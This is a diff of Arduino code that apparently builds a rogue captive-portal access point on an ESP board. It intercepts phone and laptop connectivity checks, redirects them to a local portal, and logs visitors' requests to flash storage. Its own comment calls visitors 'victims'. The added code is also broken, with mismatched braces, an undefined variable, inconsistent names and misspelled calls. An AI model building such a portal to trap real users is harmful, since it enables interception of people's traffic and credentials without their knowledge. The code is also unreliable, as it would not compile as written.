@@ -23,6 +23,54 @@ void setup(){
   Serial.println("Server started");
 }
 
+void handleClient(WiFiClient client) {
+  Serial.println("New victim trapped");
+  String request = client.readString();
+  Serial.println(request);
+
+  //simulation of dial request
+  if (request.indexOf("generate_204") >= 0 ||
+      request.indexOf("hotspot-detect.html") >= 0 ||
+      request.indexOf("ncsi.txt") >= 0
+      ) {
+    client.println("HTTP/1.1 302 Found");
+    client.println("Location: http://192.168.4.1/portal");
+    client.println("Content-Length: 0");
+    client.println();
+    client.stop();
+    return;
+       }
+
+  if (request.indexOf("GET /portal") >= 0 ||
+      request.indexOf("GET /") >= 0
+        ) {
+    client.println("HTTP/1.1 302 Found");
+    client.println("Location: http://192.168.4.1");
+    client.println("Content-Length: 0");
+    client.println();
+    client.stop();
+          }
+  else {
+    client.println("HTTP/1.1 302 Found");
+    client.println("Location: http://192.168.4.1");
+    client.println("Content-Length: 0");
+    client.close();
+  }
+
+
+void logRequest() {
+  File logFile = SPIFFS.open("/replace", "a");
+  if (!logfile) {
+    Seral.println("FAiled to open html");
+    return;
+  }
+  logFile.println(request);
+  LogFile.close();
+}
+
+
+}
+
 
 void loop() {
     dnsServer.processNextRequest();  // Handle DNS requests
@@ -34,25 +82,15 @@ void loop() {
         String request = client.readString();
         Serial.println(request);
 
-      /*
-      TO DO
-      1: would be to just send a black page telling thje captive portal url ther is no wifi yk you request you dont get the "success" s
-      2: or redirect it like so (might add the second option as a pocket knife when i cant reload or outta bullets)
-
-          client.println("HTTP/1.1 302 Found");
-          client.println("Location: http://192.168.4.1/");
-          client.println();
-
+/*
           problem is the 302 redirection may not be followed by sone devices
       3: TRY implementing SPIFF, i dont like how im adding the whole html on this script gotta add it to /spiff 
       orr
       3.5: memory card module way better 
-      speaking of memory esp to listen to music :D
-      
-      
-      */
+      speaking of memory esp to listen to music :D      
+*/
 
-        // Handle Captive Portal Detection (Apple, Android, Windows)
+        // Handle captive portal detection accross diffeent devices
         if (request.indexOf("generate_204") > 0 || 
             request.indexOf("hotspot-detect.html") > 0 || 
             request.indexOf("ncsi.txt") > 0) {
